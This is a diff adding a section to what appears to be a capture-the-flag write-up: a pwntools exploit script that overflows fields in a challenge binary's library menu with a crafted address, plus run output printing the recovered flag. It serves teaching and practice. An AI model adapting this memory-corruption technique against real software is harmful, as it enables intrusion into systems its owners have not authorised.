@@ -51,6 +51,70 @@ The plan is to make the following calls:
 
 Repeat the operation, now setting the `bibli` fields to the correct value to leak the flag, and get rich =)
 
+
+```
+#!/usr/bin/env python
+
+from pwn import *
+from cStringIO import StringIO
+import time
+import re
+
+p = process('./chall_4242')
+
+# 12+16+8
+f = StringIO(cyclic(36, n=4))
+
+nom_livre = f.read(12)
+address = f.read(12) + p32(0x08048683)
+nom_bibli = f.read(8)
+
+data = p.recvuntil('Quitter\n\n')
+
+p.send('1\n')
+print('< 1')
+data = p.recv(1024)
+p.send(nom_livre + '\n')
+data = p.recv(1024)
+
+p.send('3\n')
+print('< 3')
+data = p.recv(1024)
+
+p.send('4\n')
+print('< 4')
+data = p.recv(1024)
+p.send(address + '\n')
+data = p.recv(1024)
+p.send(nom_bibli + '\n')
+data = p.recv(1024)
+
+p.send('6\n')
+print('< 6')
+data = p.recv(1024)
+
+p.send('2\n')
+print('< 2')
+
+time.sleep(5)
+
+m = re.search('(UYB\{.*?\})', p.recv(2048))
+if m:
+  print(m.group(1))
+```
+
+```
+$ ./exploit.py
+[+] Starting local process './chall_4242': pid 2271
+< 1
+< 3
+< 4
+< 6
+< 2
+the flag is 'UYB{0cb375943cb992f2d4db605d3}'
+[*] Stopped process './chall_4242' (pid 2271)
+```
+
 # bastion.unlock.ctf:4141
 
 Roughly 100 line of clean C code.
